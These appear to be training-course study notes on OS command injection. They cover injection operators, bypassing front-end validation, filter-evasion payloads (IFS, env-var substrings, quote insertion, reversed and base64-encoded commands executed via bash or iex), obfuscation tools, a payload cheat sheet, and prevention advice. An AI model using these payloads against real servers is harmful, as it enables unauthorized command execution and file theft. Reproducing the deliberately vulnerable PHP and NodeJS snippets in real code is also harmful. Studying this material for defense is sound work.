# Command Injection Fundamentals — Complete Notes

---

## What is Command Injection?

A Command Injection vulnerability is one of the most critical types of web vulnerabilities. It allows an attacker to execute arbitrary operating system commands directly on the back-end server hosting the web application. If successful, the attacker can read sensitive files, create backdoors, pivot to other machines on the network, or completely take over the server. The reason it is so dangerous is that the attacker is not limited to the web application — they are running real OS-level commands on the machine itself.

Command injection falls under the broader category of **injection vulnerabilities**, which is ranked #3 in OWASP's Top 10 Web Application Risks due to their high impact and how commonly they appear. Injection happens when user-controlled input is misinterpreted as part of a system command or query being executed, allowing the attacker to escape the intended input boundary and run their own code.

---

## Common Injection Types (Overview)

| Injection Type | How it Happens |
|---|---|
| OS Command Injection | User input used directly as part of an OS shell command |
| Code Injection | User input placed inside a function that evaluates code (like `eval()`) |
| SQL Injection | User input used directly inside a SQL query string |
| XSS / HTML Injection | User input displayed raw in a web page without encoding |
| LDAP Injection | User input inserted into an LDAP directory query |
| NoSQL Injection | User input used inside a NoSQL database query |

All of these share the same root cause: **user input is used in a query or command without being properly sanitized first**.

---

## OS Command Injection — How it Happens

Web applications often need to run system commands on the back-end server — for example, to ping a host, check disk space, process a file, or install something. Programming languages like PHP, Python, NodeJS, and others all provide built-in functions for running OS commands. When developers use these functions and pass user input into them without cleaning the input first, the application becomes vulnerable.

### PHP Example

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

`isset($_GET['filename'])` checks if the user provided a `filename` parameter in the GET request URL. `system("touch /tmp/" . $_GET['filename'] . ".pdf")` takes the user's input and glues it directly into a shell command using string concatenation (`.`). The `system()` function in PHP runs whatever string you give it as a shell command and prints the output. If a user enters `report`, the command becomes `touch /tmp/report.pdf` — that is fine. But if a user enters `report; whoami`, the command becomes `touch /tmp/report; whoami .pdf` — the shell now runs TWO commands. There is no sanitization at all.

Common PHP functions that execute OS commands — all vulnerable if fed unsanitized input:

- `exec()` — runs a command and returns the last line of output
- `system()` — runs a command and prints all output directly
- `shell_exec()` — runs a command and returns all output as a string
- `passthru()` — runs a command and passes raw output directly to browser
- `popen()` — opens a pipe to a process for reading or writing

### NodeJS Example

```javascript
app.get("/createfile", function(req, res) {
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

`req.query.filename` reads the `filename` parameter from the URL query string. It is directly placed inside a template literal (backtick string) that builds a shell command. `child_process.exec()` runs that string as a shell command. Same vulnerability — no sanitization, user input goes straight into the shell. The exact same injection methods work here as in PHP.

---

## Detecting Command Injection

Detection and exploitation use the same basic approach — try to append extra commands to the input and see if they execute. The process works like this:

1. Find a feature in the web app that appears to run a system command (ping, file operations, network checks, etc.)
2. Identify what the command probably looks like based on the output you see
3. Try injecting an extra command using injection operators
4. If the output changes or includes the result of your injected command, injection is confirmed

### Practical Example — Host Checker App

A web application has a "Host Checker" field that takes an IP address and pings it. Normal usage:

```
Input: 127.0.0.1
Backend command: ping -c 1 127.0.0.1
Output: ping results showing 1 packet sent
```

We can guess the command structure from the output. The `-c 1` flag in ping means "send 1 packet" — this is visible in the output and tells us the exact command being used. Now we try to inject.

---

## Injection Operators — Full Reference

These are the characters/strings you place between your legitimate input and your injected command. Each one works differently depending on shell behavior.

| Operator | Character | URL-Encoded | Which Commands Execute | How it Works |
|---|---|---|---|---|
| Semicolon | `;` | `%3b` | Both | Runs command1, then always runs command2 regardless of success/failure |
| New Line | `\n` | `%0a` | Both | Shell treats newline as end of one command and start of next |
| Background | `&` | `%26` | Both | Runs command1 in background, immediately runs command2 |
| Pipe | `\|` | `%7c` | Second only | Sends output of command1 as input to command2 |
| AND | `&&` | `%26%26` | Both (only if first succeeds) | Runs command2 ONLY if command1 exits with success (exit code 0) |
| OR | `\|\|` | `%7c%7c` | Second only (only if first fails) | Runs command2 ONLY if command1 fails (exit code non-zero) |
| Sub-Shell | ` `` ` | `%60%60` | Both | Linux only — runs command inside backticks as a sub-shell |
| Sub-Shell | `$()` | `%24%28%29` | Both | Linux only — runs command inside `$()` as a sub-shell |

### Semicolon `;`

```bash
ping -c 1 127.0.0.1; whoami
```

The semicolon is a **command separator** in Linux bash and Windows PowerShell. It tells the shell "when you finish the first command, run the next one." Both commands always run no matter what. The output of both commands appears in the response.

> **Note:** Semicolon does NOT work in Windows CMD (Command Prompt). It works in PowerShell only.

### AND `&&`

```bash
ping -c 1 127.0.0.1 && whoami
```

`&&` is the **logical AND** operator. The shell runs the first command. If it succeeds (exits with code 0 = no error), it runs the second command. If the first fails, the second never runs. Since `ping 127.0.0.1` to localhost always succeeds, `whoami` always runs in this case.

### OR `||`

```bash
ping -c 1 127.0.0.1 || whoami
# whoami does NOT run here — ping succeeded
```

```bash
ping -c 1 || whoami
# whoami DOES run here — ping failed (no destination given)
```

`||` is the **logical OR** operator. The shell runs the first command. If it **fails**, it runs the second. If the first succeeds, the second is skipped. This is useful when you want to break the first command intentionally (like providing no IP to ping) so your injected command runs. Sending `|| whoami` with an empty IP field causes ping to error out, which triggers whoami.

### New Line `\n` / `%0a`

```
127.0.0.1%0awhoami
```

A newline character (`%0a` URL-encoded) acts the same as pressing Enter in a terminal. The shell sees the newline and treats everything after it as a new command. This is very useful because newlines are often NOT in blacklists (since legitimate data sometimes contains them), while semicolons and `&&` usually are blacklisted.

### Pipe `|`

```bash
ping -c 1 127.0.0.1 | whoami
```

The pipe sends the stdout (standard output) of the first command as stdin (standard input) to the second command. The output of `ping` is fed into `whoami` — but `whoami` does not use stdin, so it just ignores the pipe and runs normally. Only the second command's output appears.

---

## Bypassing Front-End Validation

Web applications often validate input on the **front-end** (in the browser using JavaScript) before submitting the form. For example, the Host Checker app might only allow IP address format (numbers and dots). If you type `127.0.0.1; whoami`, a JavaScript function catches it and shows an error — but **no request is even sent to the server**.

You can confirm this is front-end validation by opening Developer Tools (`CTRL+SHIFT+E` → Network tab). Click the submit button with the invalid payload and watch the Network tab — if **no HTTP request appears**, the validation is happening in JavaScript in the browser, not on the server.

### How to Bypass Front-End Validation

Front-end validation is trivially bypassed by sending the HTTP request directly to the server, skipping the browser entirely. The easiest way is using **Burp Suite**:

1. Configure Firefox to proxy through Burp (`127.0.0.1:8080`)
2. Enable Burp intercept
3. Submit a valid IP (`127.0.0.1`) through the normal form
4. Burp catches the request — send it to Repeater (`CTRL+R`)
5. In Repeater, manually change the IP value to your injection payload
6. URL-encode the payload (`CTRL+U` in Burp) so special characters don't get mangled in transit
7. Click Send

The server receives your crafted payload directly, bypassing JavaScript entirely. If the server does not also validate input on the back-end, your injection works.

**Example in Burp Repeater:**

```
POST /index.php HTTP/1.1
Host: TARGET_IP
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3b+whoami
```

`%3b` is the URL-encoded form of `;`. When the server decodes this, it sees `127.0.0.1; whoami` and passes it to the ping command.

---

## Identifying Filters

When a web application blocks your injection attempts on the server side, you see an error like "Invalid input." This means the back-end has a **blacklist filter** checking your input for dangerous characters or commands. Your job is to figure out exactly what is being blocked so you can work around it.

### How Blacklist Filters Work (PHP Example)

```php
$blacklist = ['&', '|', ';', ' ', '/'];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

`strpos($_POST['ip'], $character)` searches the user's input string for the blacklisted character. If found, it returns the position (a number). If not found, it returns `false`. `!== false` means "if it WAS found." If any blacklisted character is found anywhere in the input, the script prints "Invalid input" and stops. The web app never reaches the part that runs the ping command.

### Identifying What is Blacklisted — Isolate Characters One by One

Test systematically. Start with a known-good input and add characters one at a time:

```
127.0.0.1         → Works (no error)
127.0.0.1;        → Invalid input → semicolon is blacklisted
127.0.0.1%0a      → Works → newline is NOT blacklisted (use this!)
127.0.0.1%0a whoami → Invalid input → space is blacklisted
127.0.0.1%0awhoami  → Invalid input → 'whoami' command is blacklisted
```

By narrowing it down character by character, you know exactly what the filter catches. Then you can use bypass techniques for each blocked element.

---

## Bypassing Space Filters

Spaces are commonly blacklisted when the expected input (like an IP address) should not contain any spaces. But bash and PowerShell accept multiple alternatives to spaces between command arguments.

### Method 1 — Tabs `%09`

```
127.0.0.1%0a%09whoami
```

`%09` is the URL-encoded tab character. Linux bash and Windows PowerShell both treat tabs as whitespace between command arguments — exactly like a space. Most blacklists only block the space character (`%20`) and forget about tabs. This is the simplest and most reliable space bypass.

```bash
# These are identical to bash:
ping -c 1 127.0.0.1
ping	-c	1	127.0.0.1    # tabs instead of spaces — works fine
```

### Method 2 — `$IFS` Environment Variable

```
127.0.0.1%0a${IFS}whoami
```

`$IFS` stands for **Internal Field Separator** — it is a special bash variable that defines what characters bash uses to split words/fields. Its default value is a space followed by a tab followed by a newline. When bash sees `${IFS}` in a command, it expands it to a space character. So `whoami${IFS}-la` is the same as `whoami -la` to bash, but the literal string in the request contains no space character.

```bash
# Both are identical:
ls -la
ls${IFS}-la    # $IFS expands to a space at runtime
```

> **Limitation:** `${IFS}` cannot be used inside sub-shell syntax like `$()`.

### Method 3 — Brace Expansion `{command,-args}`

```bash
{ls,-la}
```

Bash **brace expansion** automatically expands `{item1,item2}` into `item1 item2` — with a space inserted between them. The shell processes the braces before executing the command, so the actual command that runs is `ls -la` with a proper space. The raw string in the request contains no space.

```bash
# These are identical:
ls -la
{ls,-la}      # bash expands this to: ls -la
```

```bash
# In injection context:
127.0.0.1%0a{whoami}
127.0.0.1%0a{cat,/etc/passwd}
```

---

## Bypassing Other Blacklisted Characters

Beyond spaces, the **slash** `/` (needed for file paths) and **semicolon** `;` are commonly blacklisted. You can produce any character using Linux environment variables without typing that character directly.

### Linux — Using Environment Variables for Slashes

Every Linux system has environment variables like `$PATH`, `$HOME`, `$PWD`. These strings contain slashes, semicolons, and other useful characters. You can extract any single character from them using bash substring syntax: `${VARIABLE:START:LENGTH}`.

```bash
echo ${PATH}
# Output: /usr/local/bin:/usr/bin:/bin
```

`${PATH:0:1}` means: take the `$PATH` variable, start at position 0 (the very first character), and take 1 character. The first character of `/usr/local/bin:...` is `/`. So `${PATH:0:1}` equals `/` without you ever typing a slash.

```bash
echo ${PATH:0:1}
# Output: /

# Use in payload to reference /etc/passwd without typing /:
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
# Equivalent to: cat /etc/passwd
```

### Linux — Using Environment Variables for Semicolons

```bash
echo ${LS_COLORS:10:1}
# Output: ;
```

`$LS_COLORS` is a variable that stores color settings for the `ls` command output. Its value contains semicolons as separators. `${LS_COLORS:10:1}` extracts 1 character starting at position 10, which happens to be `;`. This gives you a semicolon without typing one — useful if `;` is blacklisted.

```bash
# Use printenv to list all environment variables and find useful characters:
printenv
```

`printenv` prints every environment variable and its value. You can look through them to find strings containing characters you need, then use `${VARNAME:START:LENGTH}` to extract exactly that character.

### Linux — Character Shifting with `tr`

```bash
man ascii      # \ is ASCII 92, the character before it is [ which is ASCII 91
echo $(tr '!-}' '"-~'<<<[)
# Output: \
```

`tr '!-}' '"-~'` is a character translation command. It maps every character in the range `!` through `}` (ASCII 33-125) to the character one position higher. So `[` (ASCII 91) becomes `\` (ASCII 92). `<<<[` sends the character `[` as input to `tr`. The result is `\` — obtained without typing a backslash. This works for any character — find the one just before what you need in the ASCII table, then shift it up by 1.

### Windows CMD — Environment Variable Substrings

```cmd
echo %HOMEPATH:~0,-17%
# Output: \Users\htb-student  →  trimmed to: \
```

`%HOMEPATH%` in Windows is usually `\Users\htb-student`. The `~0,-17` syntax means: start at position 0, remove the last 17 characters. This leaves just `\`. The exact numbers depend on the username length, so adjust accordingly.

```cmd
echo %PROGRAMFILES:~10,-5%
# Output: (space character)
```

`%PROGRAMFILES%` is `C:\Program Files`. Position 10 is the space between "Program" and "Files". Extracting that gives you a space character without typing one.

### Windows PowerShell — Array Index Access

```powershell
$env:HOMEPATH[0]
# Output: \

$env:PROGRAMFILES[10]
# Output: (space)
```

In PowerShell, environment variable values are treated as arrays of characters. `[0]` gets the first character, `[10]` gets the 11th character, etc. `$env:HOMEPATH[0]` is `\Users\...`'s first character — a backslash. This gives you any character by index without typing it directly.

```powershell
# List all environment variables in PowerShell:
Get-ChildItem Env:
```

`Get-ChildItem Env:` lists all environment variables and their values — the PowerShell equivalent of Linux's `printenv`. Use it to find variables containing the characters you need.

---

## Bypassing Blacklisted Commands

After bypassing space and character filters, you may find that specific commands like `whoami`, `cat`, `ls` are themselves blacklisted. The web app checks if the input contains the exact command word. You need to make your command look different while still executing the same thing.

### Technique 1 — Character Insertion (Linux & Windows)

Bash and PowerShell both ignore certain characters placed inside command names. The command still executes exactly the same — the shell strips out the ignored characters and runs the actual command.

**Single quotes `'` — works on Linux and Windows:**

```bash
w'h'o'am'i
# bash executes: whoami
```

**Double quotes `"` — works on Linux and Windows:**

```bash
w"h"o"am"i
# bash executes: whoami
```

**Rules:**
- You cannot mix single and double quotes in the same command
- The total number of quotes must be **even** (every opening quote must have a closing quote)
- You can place them anywhere inside the word — as many as you want, as long as count is even

```bash
# All of these execute whoami:
wh'oa'mi
w'h'o'a'm'i
"w"hoami
who"am"i
```

**Backslash `\` — Linux only:**

```bash
w\ho\am\i
# bash executes: whoami
```

Bash ignores `\` inside unquoted command names (it is the escape character, but escaping a normal letter does nothing). Any number of backslashes can be inserted — no even/odd rule.

**`$@` positional parameter — Linux only:**

```bash
who$@ami
# bash executes: whoami
```

`$@` expands to the list of positional parameters passed to the script. When used interactively or in a simple injection, it expands to nothing (empty string), so `who$@ami` becomes `whoami`.

**Caret `^` — Windows CMD only:**

```cmd
who^ami
# CMD executes: whoami
```

In Windows CMD, `^` is the escape character. `^` before a normal letter is ignored, so `who^ami` is treated as `whoami`. This does not work in PowerShell.

### Technique 2 — Case Manipulation

**Windows (CMD and PowerShell) — case-insensitive:**

```powershell
WhOaMi
WHOAMI
wHoAmI
```

Windows command interpreters are completely case-insensitive. Any casing variation of `whoami` works. If the blacklist only checks for lowercase `whoami`, any case change bypasses it instantly.

**Linux — case-sensitive, needs a conversion command:**

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

`tr "[A-Z]" "[a-z]"` translates (replaces) every uppercase letter (A-Z) with its lowercase equivalent (a-z). `<<<` is a here-string — it feeds the string `WhOaMi` directly to `tr` without a pipe. The result `whoami` is passed to a sub-shell `$()` which executes it. The blacklist sees `WhOaMi` — no match. Bash sees `whoami` — executes it.

```bash
# Alternative:
$(a="WhOaMi";printf %s "${a,,}")
```

`a="WhOaMi"` stores the mixed-case string in variable `a`. `${a,,}` is bash parameter expansion that converts the entire value to lowercase. `printf %s` prints it without a newline. The sub-shell `$()` captures the output and executes it.

> **Remember:** If the web app also filters spaces, replace spaces in these commands with `%09` (tab) or `${IFS}`.

### Technique 3 — Reversed Commands

Instead of typing the command forward, type it backward. The blacklist looks for `whoami` — it will not find `imaohw`. Then use a sub-shell to reverse it back at runtime and execute it.

**Linux:**

```bash
# Step 1: Generate the reversed string on your machine:
echo 'whoami' | rev
# Output: imaohw

# Step 2: Use it in the injection payload:
$(rev<<<'imaohw')
```

`rev` reverses a string line by line. `<<<` feeds the string `'imaohw'` directly to `rev`. The output `whoami` is captured by `$()` and executed as a command. The raw payload string contains `imaohw` — no match against the `whoami` blacklist.

```bash
# For a command with arguments like: cat /etc/passwd
echo 'cat /etc/passwd' | rev
# Output: dwssap/cte/ tac

$(rev<<<'dwssap/cte/ tac')
# Executes: cat /etc/passwd
```

**Windows PowerShell:**

```powershell
# Step 1: Reverse the string:
"whoami"[-1..-20] -join ''
# Output: imaohw
```

`"whoami"[-1..-20]` treats the string as a character array and creates a reversed range (from last character to first). `-join ''` joins the characters back into a string without a separator.

```powershell
# Step 2: Execute the reversed string:
iex "$('imaohw'[-1..-20] -join '')"
```

`iex` is PowerShell's `Invoke-Expression` command — it takes a string and executes it as PowerShell code. `$('imaohw'[-1..-20] -join '')` reverses `imaohw` back to `whoami` inside the sub-expression `$()`. `iex` then runs `whoami`.

### Technique 4 — Base64 Encoded Commands

Encode your entire command in base64. The blacklist sees a string of random-looking letters and numbers — no recognizable command name. At runtime, decode it and pipe it to bash/PowerShell for execution.

**Linux:**

```bash
# Step 1: Encode your command (on your local machine):
echo -n 'cat /etc/passwd | grep 33' | base64
# Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

`echo -n` prints the string without adding a newline at the end (`-n` = no newline). The newline would get encoded too and corrupt the payload. `base64` encodes the input using Base64 encoding — converts binary/text into a safe ASCII string of letters, numbers, `+`, `/`, and `=` padding.

```bash
# Step 2: Use in injection payload:
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

`base64 -d<<<Y2F0...` decodes the base64 string back to `cat /etc/passwd | grep 33`. `$()` captures the decoded string. `bash<<<` (here-string) feeds that string to bash as a command to execute. The `<<<` is used instead of a pipe `|` because `|` might itself be blacklisted.

> **Why use `bash<<<` instead of `| bash`?** Because `|` (pipe) is often blacklisted. `<<<` is a here-string that achieves the same result without the pipe character.

```bash
# If bash is also blacklisted, use sh:
sh<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# If base64 is blacklisted, use openssl:
openssl enc -d -base64 -in <<<Y2F0...
```

**Windows PowerShell:**

```powershell
# Step 1: Encode (Windows uses UTF-16LE encoding for PowerShell):
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# Output: dwBoAG8AYQBtAGkA
```

`[System.Text.Encoding]::Unicode.GetBytes('whoami')` converts the string to a byte array using UTF-16LE (Unicode) encoding — this is what PowerShell expects. `[Convert]::ToBase64String()` then encodes those bytes as base64.

```powershell
# Step 2: Decode and execute:
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

`[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')` decodes the base64 back to a byte array. `[System.Text.Encoding]::Unicode.GetString()` converts the byte array back to the original string `whoami`. `iex` executes that string as a PowerShell command.

**Linux encoding for Windows payload:**

```bash
# If you are preparing a Windows payload on a Linux machine:
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# Output: dwBoAG8AYQBtAGkA
```

`iconv -f utf-8 -t utf-16le` converts the string from UTF-8 encoding to UTF-16 Little Endian (which is what Windows PowerShell uses). Then `base64` encodes it. This ensures the base64 string matches what PowerShell expects when it decodes it.

---

## Advanced Command Obfuscation

When basic techniques fail against more advanced WAFs or filters, these advanced methods add another layer of disguise.

### Case Manipulation (Advanced Linux)

Already covered above, but the key point: on Linux, you **must** use a command that converts to lowercase at runtime because bash is case-sensitive. Just sending `WHOAMI` will fail on Linux — it will look for a binary literally named `WHOAMI`.

```bash
# This works on Linux:
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# But this does NOT work on Linux:
WhOaMi    # Error: command not found
```

On Windows, any casing works directly:

```powershell
# All work on Windows:
WHOAMI
whoami
WhOaMi
wHoAmI
```

### Combining Multiple Techniques

In real scenarios you often need to bypass multiple filters at once — spaces, slashes, specific characters, and command names. Combine techniques:

```bash
# Target: cat /etc/passwd
# Filters: space blacklisted, / blacklisted, 'cat' blacklisted

# Replace space with ${IFS}, replace / with ${PATH:0:1}, obfuscate cat with quotes:
c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Or use base64 to bypass everything at once:
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkCg==)
```

The base64 approach is the most powerful because the encoded string contains no recognizable commands, no spaces, no slashes, no special characters — just alphanumeric characters and `=` signs.

---

## Evasion Tools

When manual obfuscation is too slow or basic techniques are caught by advanced WAFs, automated obfuscation tools can generate complex, unique payloads.

### Linux — Bashfuscator

Bashfuscator is a Python tool that automatically obfuscates bash commands using many different techniques simultaneously.

**Installation:**

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
```

`git clone` downloads the entire Bashfuscator repository from GitHub into a folder called `Bashfuscator` on your local machine.

```bash
cd Bashfuscator
```

`cd Bashfuscator` moves your terminal into the downloaded folder.

```bash
pip3 install setuptools==65
```

`pip3 install setuptools==65` installs a specific version of the `setuptools` Python library that Bashfuscator requires. The `==65` pins it to version 65 to avoid compatibility issues with newer versions.

```bash
python3 setup.py install --user
```

`python3 setup.py install --user` installs Bashfuscator itself into your user's Python environment (`--user` means no admin/sudo needed — it installs to your home directory).

**Basic usage:**

```bash
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
```

`-c 'cat /etc/passwd'` specifies the command to obfuscate. Without additional flags, Bashfuscator randomly picks an obfuscation technique and applies it. The output can be thousands of characters long.

**Controlled usage (shorter, simpler output):**

```bash
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

`-s 1` sets the "size" level to 1 (smallest/simplest output). `-t 1` sets the "time" level to 1 (fastest, least complex). `--no-mangling` disables extra variable name randomization. `--layers 1` applies only one layer of obfuscation instead of stacking multiple. This produces a shorter, more manageable payload while still being obfuscated.

**Example output:**

```bash
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

This looks nothing like `cat /etc/passwd` but executes exactly the same thing.

**Test the output before using:**

```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

`bash -c '...'` runs the string as a bash command directly in terminal. Always verify the obfuscated command actually works before injecting it — if it does not execute correctly locally, it will not work in the target either.

### Windows — DOSfuscation (Invoke-DOSfuscation)

DOSfuscation is an interactive PowerShell tool for obfuscating Windows CMD and PowerShell commands.

**Installation:**

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

`git clone` downloads the tool. `Import-Module .\Invoke-DOSfuscation.psd1` loads the PowerShell module from the `.psd1` manifest file in the current directory — this registers all the tool's functions into your PowerShell session. `Invoke-DOSfuscation` starts the interactive tool.

**Usage inside the tool:**

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
```

`SET COMMAND` tells the tool which command you want to obfuscate. `type` is the Windows CMD equivalent of Linux's `cat` — it prints file contents.

```powershell
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

`encoding` selects the encoding obfuscation category. `1` picks the first encoding method. The tool outputs an obfuscated version like:

```
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent\Desktop\flag.txt
```

This uses environment variable substrings to spell out the command without typing the actual letters directly. When CMD expands all the `%VAR:~start,len%` expressions, it reconstructs the original command.

**Test it:**

```cmd
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\htb-student\Desktop\flag.txt
test_flag
```

The output shows the file contents, confirming the obfuscated command works.

> **Tip:** If you are on Linux but need to test Windows PowerShell obfuscation, run `pwsh` to open a PowerShell session on Linux and follow the same steps.

---

## Complete Cheat Sheet

### Injection Operators

| Operator | Character | URL-Encoded | Executes |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands |
| New Line | `\n` | `%0a` | Both commands |
| Background | `&` | `%26` | Both (second shown first) |
| Pipe | `\|` | `%7c` | Second command only |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ` `` ` | `%60%60` | Both (Linux only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux only) |

---

### Linux — Space Filter Bypasses

| Bypass | How to Use | Notes |
|---|---|---|
| `%09` | `cmd%09-arg` | Tab character — works everywhere |
| `${IFS}` | `cmd${IFS}-arg` | Expands to space — cannot use inside `$()` |
| `{cmd,-arg}` | `{ls,-la}` | Brace expansion adds spaces automatically |

### Linux — Character Filter Bypasses

| Character Needed | Bypass | How it Works |
|---|---|---|
| `/` (slash) | `${PATH:0:1}` | First character of PATH is always `/` |
| `;` (semicolon) | `${LS_COLORS:10:1}` | Position 10 of LS_COLORS is `;` |
| Any character | `$(tr '!-}' '"-~'<<<PREV_CHAR)` | Shifts ASCII value up by 1 |
| View all vars | `printenv` | Find variables containing needed characters |

### Linux — Command Blacklist Bypasses

| Technique | Example | Notes |
|---|---|---|
| Single quotes | `w'h'o'am'i` | Must be even count, no mixing types |
| Double quotes | `w"h"o"am"i` | Must be even count, no mixing types |
| Backslash | `w\ho\am\i` | Any count, Linux only |
| `$@` insertion | `who$@ami` | Linux only |
| Case + tr | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Linux only |
| Case + printf | `$(a="WhOaMi";printf %s "${a,,}")` | Linux only |
| Reversed | `$(rev<<<'imaohw')` | Reverse string then execute |
| Base64 | `bash<<<$(base64 -d<<<BASE64STRING)` | Encode entire command |

---

### Windows CMD — Space Filter Bypasses

| Bypass | How to Use | Notes |
|---|---|---|
| `%09` | `cmd%09-arg` | Tab character |
| `%PROGRAMFILES:~10,-5%` | Inline | Extracts space from environment variable |

### Windows CMD — Character Filter Bypasses

| Character Needed | Bypass | How it Works |
|---|---|---|
| `\` (backslash) | `%HOMEPATH:~0,-17%` | Extracts `\` from HOMEPATH |
| View all vars | `set` in CMD | Lists all environment variables |

### Windows CMD — Command Blacklist Bypasses

| Technique | Example | Notes |
|---|---|---|
| Any case | `WhoAmI` | CMD is case-insensitive |
| Caret insertion | `who^ami` | CMD only, `^` is ignored |
| Single/double quotes | `w"h"o"am"i` | Even count required |

---

### Windows PowerShell — Space Filter Bypasses

| Bypass | How to Use | Notes |
|---|---|---|
| `%09` | Tab character | Works in PS too |
| `$env:PROGRAMFILES[10]` | Inline | Index 10 of PROGRAMFILES is a space |

### Windows PowerShell — Character Filter Bypasses

| Character Needed | Bypass | How it Works |
|---|---|---|
| `\` (backslash) | `$env:HOMEPATH[0]` | First character of HOMEPATH is `\` |
| View all vars | `Get-ChildItem Env:` | Lists all env variables |

### Windows PowerShell — Command Blacklist Bypasses

| Technique | Example | Notes |
|---|---|---|
| Any case | `WhOaMi` | PS is case-insensitive |
| Single/double quotes | `w"h"o"am"i` | Even count required |
| Reversed | `iex "$('imaohw'[-1..-20] -join '')"` | Reverse and execute |
| Base64 | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64')))"` | Full encoding bypass |

---

## Prevention and Mitigation

### 1. Never Pass User Input Directly to Shell Functions

Avoid functions like `system()`, `exec()`, `shell_exec()`, `passthru()` entirely when user input is involved. If you must use them, never concatenate user input into the command string.

### 2. Use Language-Specific APIs Instead of Shell Commands

Instead of `system("ping " + userInput)`, use a proper network library that handles the ping operation natively — no shell involved, no injection possible. For file operations, use file system APIs instead of shell commands.

### 3. Input Validation — Whitelist Approach

Only allow characters that are absolutely necessary for the input's purpose. For an IP address field, only allow digits (`0-9`) and dots (`.`). Reject everything else. This is called a **whitelist** approach — define what IS allowed and block everything else. A blacklist (blocking specific bad characters) is much weaker because attackers always find characters not on the list.

```php
// Whitelist: only allow valid IP format
if (!filter_var($_POST['ip'], FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}
```

`filter_var($input, FILTER_VALIDATE_IP)` is a PHP built-in function that checks if the input is a valid IP address format. If it is not, the script stops. Only real IP addresses pass through.

### 4. Input Sanitization — Escape Special Characters

If you must use user input in a shell command, use functions that escape shell special characters:

```php
$safe_input = escapeshellarg($_POST['ip']);
system("ping -c 1 " . $safe_input);
```

`escapeshellarg()` wraps the input in single quotes and escapes any single quotes inside it. This prevents the input from ever being interpreted as shell code — it is always treated as a single argument string.

### 5. Run with Minimum Privileges

The web server and database processes should run as low-privilege users (like `www-data` on Linux). Even if command injection succeeds, the attacker can only do what that limited user can do — not read root files, not install system-wide software, not modify system configuration.

### 6. Web Application Firewall (WAF)

A WAF adds a layer of detection for common injection patterns. It is not a replacement for proper coding but provides an additional defense layer that catches many automated attacks and less sophisticated attempts.

---

*These notes cover OS Command Injection from basic concepts through exploitation, filter identification, bypassing spaces/characters/commands, advanced obfuscation, and evasion tools with a full cheat sheet.*
